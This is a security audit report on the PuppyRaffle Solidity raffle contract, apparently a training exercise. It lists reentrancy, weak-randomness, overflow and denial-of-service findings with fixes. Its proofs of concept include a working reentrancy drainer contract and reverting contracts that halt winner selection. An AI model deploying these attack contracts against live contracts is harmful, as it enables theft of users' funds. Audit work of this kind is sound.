# PuppyRaffle Analysis Report

- author: ThalesLiu
- date: December 10, 2024

# Review

This project is a raffle project, people use money to enter the system to win a cute dog NFT, the system will select a winner from the participants during the raffle.

## Roles

- Owner: The only one who can change the feeAddress, denominated by the owner variable.
- Fee User: The user who takes a cut of raffle entrance fees. Denominated by the feeAddress variable.
- Raffle Entrant: Anyone who enters the raffle. Denominated by being in the players array.

# Table of Contents

<details>
<summary>See table</summary>

- [PuppyRaffle Analysis Report](#puppyraffle-analysis-report)
- [Review](#review)
  - [Roles](#roles)
- [Table of Contents](#table-of-contents)
- [Summary](#summary)
  - [Files Summary](#files-summary)
  - [Files Details](#files-details)
  - [Issue Summary](#issue-summary)
- [High Issues](#high-issues)
  - [H-1 `PuppyRaffle::selectWinner()` uses a weak PRNG:` uint256 winnerIndex =uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;`](#h-1-puppyraffleselectwinner-uses-a-weak-prng-uint256-winnerindex-uint256keccak256abiencodepackedmsgsender-blocktimestamp-blockdifficulty--playerslength)
    - [Description:](#description)
    - [Impact: High](#impact-high)
    - [Recommended Mitigation:](#recommended-mitigation)
  - [H-2 `PuppyRaffle::refund()` maybe attacked by reentrancy attack, that will lose the contract balance.](#h-2-puppyrafflerefund-maybe-attacked-by-reentrancy-attack-that-will-lose-the-contract-balance)
    - [Description:](#description-1)
    - [Impact:](#impact)
    - [Proof of Concept:](#proof-of-concept)
    - [Recommended Mitigation:](#recommended-mitigation-1)
  - [H-3 integer overflow of `PuppyRaffle::toralFees` loses fees](#h-3-integer-overflow-of-puppyraffletoralfees-loses-fees)
    - [Description:](#description-2)
    - [Impact:](#impact-1)
    - [Proof of Concept:](#proof-of-concept-1)
    - [Recommended Mitigation:](#recommended-mitigation-2)
  - [H-4 Malicious winner can halt the system forever.](#h-4-malicious-winner-can-halt-the-system-forever)
    - [Description:](#description-3)
    - [Proof of Concept:](#proof-of-concept-2)
    - [Recommended Mitigation:](#recommended-mitigation-3)
- [Middium Issues](#middium-issues)
  - [M-1 Duplicate loop function in `PuppyRaffle::enterRaffle()` is a potential dos attack, and it increments the gas costs for future entrants.](#m-1-duplicate-loop-function-in-puppyraffleenterraffle-is-a-potential-dos-attack-and-it-increments-the-gas-costs-for-future-entrants)
    - [Description:](#description-4)
    - [Impact:](#impact-2)
    - [Proof of Concept:](#proof-of-concept-3)
    - [Recommended Mitigation:](#recommended-mitigation-4)
  - [M-2 Balance check on PuppyRaffle::withdrawFees enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals](#m-2-balance-check-on-puppyrafflewithdrawfees-enables-griefers-to-selfdestruct-a-contract-to-send-eth-to-the-raffle-blocking-withdrawals)
    - [Description:](#description-5)
    - [Impact: This would prevent the feeAddress from withdrawing fees. A malicious user could see a withdrawFee transaction in the mempool, front-run it, and block the withdrawal by sending fees.](#impact-this-would-prevent-the-feeaddress-from-withdrawing-fees-a-malicious-user-could-see-a-withdrawfee-transaction-in-the-mempool-front-run-it-and-block-the-withdrawal-by-sending-fees)
    - [Proof of Concept:](#proof-of-concept-4)
    - [Recommended Mitigation:](#recommended-mitigation-5)
- [Low Issues](#low-issues)
  - [L-1: `public` functions not used internally could be marked `external`](#l-1-public-functions-not-used-internally-could-be-marked-external)
  - [L-2: State variable changes but no event is emitted.](#l-2-state-variable-changes-but-no-event-is-emitted)
  - [L-3: Event is missing `indexed` fields](#l-3-event-is-missing-indexed-fields)
- [Gas Audit](#gas-audit)
  - [G-1 `PuppyRaffle::commonImageUri` and `PuppyRaffle::rareImageUri` and `PuppyRaffle::legendaryImageUri` only use in constructor. We can convert them to constant variable. And `PuppyRaffle::raffleDuration` also never change during contract. Then we can change it to `immutable`.](#g-1-puppyrafflecommonimageuri-and-puppyrafflerareimageuri-and-puppyrafflelegendaryimageuri-only-use-in-constructor-we-can-convert-them-to-constant-variable-and-puppyraffleraffleduration-also-never-change-during-contract-then-we-can-change-it-to-immutable)
    - [Description \& Recommended:](#description--recommended)
  - [G-2 In Loop function like `players.length` as condition, it read from the storage variable and waste gas.](#g-2-in-loop-function-like-playerslength-as-condition-it-read-from-the-storage-variable-and-waste-gas)
    - [Recommendeds:](#recommendeds)
    - [Impact: Low](#impact-low)
- [Info](#info)
  - [I-1 Floating pragmas](#i-1-floating-pragmas)
    - [Description:](#description-6)
    - [Recommendation:](#recommendation)
  - [I-2 Need to use normative format to make it easier for people to read](#i-2-need-to-use-normative-format-to-make-it-easier-for-people-to-read)
    - [Description \& Recommended:](#description--recommended-1)
  - [I-3 Test Coverage](#i-3-test-coverage)
    - [Description:](#description-7)
    - [Recommended Mitigation:](#recommended-mitigation-6)
  - [I-4 `PuppyRaffle::_isActivePlayer()` is not used during contract.](#i-4-puppyraffle_isactiveplayer-is-not-used-during-contract)
    - [Description:](#description-8)
    - [Recommended:](#recommended)
  - [I-5 Zero Address may be erroneously considered an active player](#i-5-zero-address-may-be-erroneously-considered-an-active-player)
    - [Description](#description-9)
    - [Recommended:](#recommended-1)
  - [I-6 `PuppyRaffle::feeAddress` is not checked with zero address.](#i-6-puppyrafflefeeaddress-is-not-checked-with-zero-address)
    - [Description:](#description-10)
    - [Recommended Mitigation:](#recommended-mitigation-7)

</details>

# Summary

## Files Summary

| Key         | Value |
| ----------- | ----- |
| .sol Files  | 1     |
| Total nSLOC | 143   |

## Files Details

| Filepath            | nSLOC   |
| ------------------- | ------- |
| src/PuppyRaffle.sol | 143     |
| **Total**           | **143** |

## Issue Summary

# High Issues

## H-1 `PuppyRaffle::selectWinner()` uses a weak PRNG:` uint256 winnerIndex =uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;`

### Description:

Weak PRNG due to a modulo on block.timestamp, now or blockhash. These can be influenced by miners to some extent so they should be avoided.
Eve is a miner. Eve calls guessing and re-orders the block containing the transaction. As a result, Eve wins the game.

### Impact: High

### Recommended Mitigation:

Do not use block.timestamp, now or blockhash as a source of randomness, may use the chainlink VRF to instead.

## H-2 `PuppyRaffle::refund()` maybe attacked by reentrancy attack, that will lose the contract balance.

### Description:

The `PuppyRaffle::refund()` is not follow CEI(check - effect - interact) pattern, enables the participants to drain the balance of the contract.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);

@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

A participant who has entered the raffle could have a `fallback`or`receive` function that calls `PuppyRaffle::refund()` again and claim other refund. They could continue to cycle this until the contract balance is drained.

### Impact:

All fees paid by raffle entrants could be stolen by the malicious participant.

### Proof of Concept:

```javascript
......
    function test_refundAttack() public {
        RefundAttacker refundAttacker = new RefundAttacker(puppyRaffle);
        vm.deal(address(refundAttacker), entranceFee);
        uint256 startingContractBalance = address(puppyRaffle).balance;
        uint256 startingAttackerBalance = address(refundAttacker).balance;
        refundAttacker.attack();
        uint256 endingContractBalance = address(puppyRaffle).balance;
        uint256 endingAttackerBalance = address(refundAttacker).balance;
        console.log("Ending Contract Balance", endingContractBalance);
        console.log("Ending Attacker Balance", endingAttackerBalance);
        assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
        assertEq(address(puppyRaffle).balance, 0);
    }
}

contract RefundAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 index;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        index = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(index);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(index);
        }
    }

    receive() external payable {}
}
```

### Recommended Mitigation:

Use CEI pattern or use the `nonReentrant` modifier in openzeppelin.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

## H-3 integer overflow of `PuppyRaffle::toralFees` loses fees

### Description:

The `PuppyRaffle::toralFees` is uint64, in Solidity versions prior to 0.8.0, integers were subject to integer overflows.

```bash
➜ type(uint64).max
Type: uint64
├ Hex: 0x
├ Hex (full word): 0x000000000000000000000000000000000000000000000000ffffffffffffffff
└ Decimal: 18446744073709551615

```

### Impact:

1. It can not withdraw fees.
2. It will lose gas.

### Proof of Concept:

```javascript
  function test_integerOverflow() public playersEntered {
        // first we collect some fees.
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        console.log("Starting Total Fees", startingTotalFees);

        uint256 playerNum = 90;
        address[] memory players = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playerNum}(players);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("Ending Total Fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        vm.prank(address(puppyRaffle));
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

### Recommended Mitigation:

1. Maybe we can use `uint256` to instead `uint64`
2. And we dont use strict equality `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");`
3. Or we need to use the latest solidity version.

## H-4 Malicious winner can halt the system forever.

### Description:

In the `PuppyRaffle::selectWinner()` function have

```javascript
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

1. if have a malicious contract use fallback to attack the system, then the system may halt.
2. or There's another attack vector that can be used to halt the raffle, leveraging the fact that the selectWinner function mints an NFT to the winner using the `safeMint` function. This function, inherited from the ERC721 contract, attempts to call the `onERC721Received` hook on the receiver if it is a smart contract. Reverting when the contract does not implement such function.

### Proof of Concept:

```javascript
    function test_SelectWinnerDoS() public {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        address[] memory players = new address[](4);
        players[0] = address(new SelectWinnerAttack());
        players[1] = address(new SelectWinnerAttack());
        players[2] = address(new SelectWinnerAttack());
        players[3] = address(new SelectWinnerAttack());
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
contract SelectWinnerAttack {
    fallback() external payable {
        revert();
    }
}

```

Or

```javascript
contract SelectWinnerAttack {
    receive() external payable {
        revert();
    }
}
```

### Recommended Mitigation:

Favor pull-payments over push-payments. This means modifying the selectWinner function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of selectWinner.

# Middium Issues

## M-1 Duplicate loop function in `PuppyRaffle::enterRaffle()` is a potential dos attack, and it increments the gas costs for future entrants.

### Description:

The `PuppyRaffle::enterRaffle` function loops through the players array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means that the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the players array, is an additional check the loop will have to make.

### Impact:

1. The gas costs for raffle entrants will greatly increase as more players enter the raffle.
2. Front-running opportunities are created for malicious users to increase the gas costs of other users, so their transaction fails.

### Proof of Concept:

```javascript
   /**
     * how to test enter dos attack
     * 1. now first 100 enterers participate in the raffle and they used the gas less than the second 100 enterers used. if the players have multiple enterers, may cause the dos attack
     */
    function test_denialOfServieEnter() public {
        // address[] memory players = new address[](1);
        // players[0] = playerOne;
        // puppyRaffle.enterRaffle{value: entranceFee}(players);
        // assertEq(puppyRaffle.players(0), playerOne);

        vm.txGasPrice(1);
        uint256 playerNum = 100;
        address[] memory players = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playerNum}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsed = gasStart - gasEnd;
        console.log("Gas Used", gasUsed * tx.gasprice);

        address[] memory playersSecond = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++) {
            playersSecond[i] = address(i + playerNum);
        }
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playerNum}(playersSecond);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = gasStartSecond - gasEndSecond;
        console.log("Second Gas Used", gasUsedSecond * tx.gasprice);

        assert(gasUsedSecond > gasUsed);
    }

```

### Recommended Mitigation:

Recommended Mitigation: There are a few recommended mitigations.

Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

```javascript
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use OpenZeppelin's EnumerableSet library.

## M-2 Balance check on PuppyRaffle::withdrawFees enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals

### Description:

The `PuppyRaffle::withdrawFees` function checks the totalFees equals the ETH balance of the contract (address(this).balance). Since this contract doesn't have a payable fallback or receive function, you'd think this wouldn't be possible, but a user could `selfdesctruct` a contract with ETH in it and force funds to the PuppyRaffle contract, breaking this check.

```javascript
    function withdrawFees() external {

@>    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
      uint256 feesToWithdraw = totalFees;
      totalFees = 0;
      (bool success,) = feeAddress.call{value: feesToWithdraw}("");
      require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

### Impact: This would prevent the feeAddress from withdrawing fees. A malicious user could see a withdrawFee transaction in the mempool, front-run it, and block the withdrawal by sending fees.

### Proof of Concept:

    PuppyRaffle has 800 wei in it's balance, and 800 totalFees.
    Malicious user sends 1 wei via a selfdestruct
    feeAddress is no longer able to withdraw funds

### Recommended Mitigation:

Remove the balance check on the PuppyRaffle::withdrawFees function.

```diff
    function withdrawFees() external {

-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
  }
```

# Low Issues

## L-1: `public` functions not used internally could be marked `external`

Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.

<details><summary>3 Found Instances</summary>

- Found in src/PuppyRaffle.sol [Line: 80](src/PuppyRaffle.sol#L80)

  ```javascript
      function enterRaffle(address[] memory newPlayers) public payable {
  ```

- Found in src/PuppyRaffle.sol [Line: 97](src/PuppyRaffle.sol#L97)

  ```javascript
      function refund(uint256 playerIndex) public {
  ```

- Found in src/PuppyRaffle.sol [Line: 193](src/PuppyRaffle.sol#L193)

  ```javascript
      function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
  ```

  </details>

## L-2: State variable changes but no event is emitted.

State variable changes in this function but no event is emitted.

<details><summary>2 Found Instances</summary>

- Found in src/PuppyRaffle.sol [Line: 126](src/PuppyRaffle.sol#L126)

  ```javascript
      function selectWinner() external {
  ```

- Found in src/PuppyRaffle.sol [Line: 160](src/PuppyRaffle.sol#L160)

  ```javascript
      function withdrawFees() external {
  ```

</details>

## L-3: Event is missing `indexed` fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

<details><summary>3 Found Instances</summary>

- Found in src/PuppyRaffle.sol [Line: 53](src/PuppyRaffle.sol#L53)

  ```javascript
      event RaffleEnter(address[] newPlayers);
  ```

- Found in src/PuppyRaffle.sol [Line: 54](src/PuppyRaffle.sol#L54)

  ```javascript
      event RaffleRefunded(address player);
  ```

- Found in src/PuppyRaffle.sol [Line: 55](src/PuppyRaffle.sol#L55)

  ```javascript
      event FeeAddressChanged(address newFeeAddress);
  ```

</details>

# Gas Audit

## G-1 `PuppyRaffle::commonImageUri` and `PuppyRaffle::rareImageUri` and `PuppyRaffle::legendaryImageUri` only use in constructor. We can convert them to constant variable. And `PuppyRaffle::raffleDuration` also never change during contract. Then we can change it to `immutable`.

### Description & Recommended:

Due to these variable only use in constructor and not change during the contract. So we can change them to constant variable. State variables that are not updated following deployment should be declared constant to save gas.
Like `string private legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";`
to `string private constant LEGENDARYIMAGEURI = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";`
Add the `constant` attribute to state variables that never change.
And `uint256 public raffleDuration;` to `uint256 public immutable i_raffleDuration;` to save gas. Add the immutable attribute to state variables that never change or are set only in the constructor.

## G-2 In Loop function like `players.length` as condition, it read from the storage variable and waste gas.

Description:
The evm code `sload` use basic gas is 100, and the `mload` use basic gas is 3. So we can make some change.
Like:

```diff
    function getActivePlayerIndex(address player) external view returns (uint256) {
+       uint256 mlength  = players.length;
+       for (uint256 i = 0; i < mlength; i++) {
-       for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

### Recommendeds:

Cache the lengths of storage arrays if they are used and not modified in for loops.

### Impact: Low

# Info

## I-1 Floating pragmas

### Description:

```bash
4 different versions of Solidity are used:
        - Version constraint >=0.6.0 is used by:
                ->=0.6.0 (lib/base64/base64.sol#3)
        - Version constraint >=0.6.0<0.8.0 is used by:
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/access/Ownable.sol#3)
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/introspection/ERC165.sol#3)
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/introspection/IERC165.sol#3)
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/math/SafeMath.sol#3)
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#3)
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol#3)
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Context.sol#3)
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/EnumerableMap.sol#3)
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/EnumerableSet.sol#3)
                ->=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Strings.sol#3)
        - Version constraint >=0.6.2<0.8.0 is used by:
                ->=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol#3)
                ->=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Enumerable.sol#3)
                ->=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Metadata.sol#3)
                ->=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Address.sol#3)
        - Version constraint ^0.7.6 is used by:
                -^0.7.6 (src/PuppyRaffle.sol#2)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#different-pragma-directives-are-used
```

### Recommendation:

Use one Solidity version and use the latest solidity version.

## I-2 Need to use normative format to make it easier for people to read

### Description & Recommended:

Like `uint256 public immutable entranceFee;` may convert to `uint256 public immutable i_entranceFee;`. Immutable variable can covert to `i_xxxx` and storage variable can convert to `s_xxxxx`.

Like

```javascript
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
```

All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called "magic numbers".

## I-3 Test Coverage

### Description:

The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.
Ran 1 test suite in 397.64ms (350.89ms CPU time): 19 tests passed, 0 failed, 0 skipped (19 total tests)
| File | % Lines | % Statements | % Branches | % Funcs |
|------------------------------|----------------|----------------|----------------|---------------|
| script/DeployPuppyRaffle.sol | 0.00% (0/3) | 0.00% (0/4) | 100.00% (0/0) | 0.00% (0/1) |
| src/PuppyRaffle.sol | 84.85% (56/66) | 84.88% (73/86) | 69.23% (18/26) | 80.00% (8/10) |
| Total | 81.16% (56/69) | 81.11% (73/90) | 69.23% (18/26) | 72.73% (8/11) |

### Recommended Mitigation:

Increase test coverage to 90% or higher, especially for the Branches column.

## I-4 `PuppyRaffle::_isActivePlayer()` is not used during contract.

### Description:

`PuppyRaffle::_isActivePlayer()` at `https://github.com/Cyfrin/4-puppy-raffle-audit/blob/15c50ec22382bb1f3106aba660e7c590df18dcac/src/PuppyRaffle.sol#L173` is not used during contract.

### Recommended:

May be can deleted to save gas.

## I-5 Zero Address may be erroneously considered an active player

### Description

The `PuppyRaffle::refund()` function will remove the active players from players, then this index of players will change to zero after sendValue, but if someone pass a zero address to `PuppyRaffle::getActivePlayerIndex()` then it will return a active index.

### Recommended:

Skip zero addresses when iterating the players array in the `PuppyRaffle::getActivePlayerIndex`. Do note that this change would mean that the zero address can never be an active player. Therefore, it would be best if you also prevented the zero address from being registered as a valid player in the `PuppyRaffle::enterRaffle` function.

## I-6 `PuppyRaffle::feeAddress` is not checked with zero address.

### Description:

The feeAddress can set to a zero address, then will lose the gas.

```bash
PuppyRaffle.constructor(uint256,address,uint256)._feeAddress (src/PuppyRaffle.sol#60) lacks a zero-check on :
                - feeAddress = _feeAddress (src/PuppyRaffle.sol#62)
PuppyRaffle.changeFeeAddress(address).newFeeAddress (src/PuppyRaffle.sol#171) lacks a zero-check on :
                - feeAddress = newFeeAddress (src/PuppyRaffle.sol#172)
```

### Recommended Mitigation:

Add a zero address check whenever the feeAddress is updated.
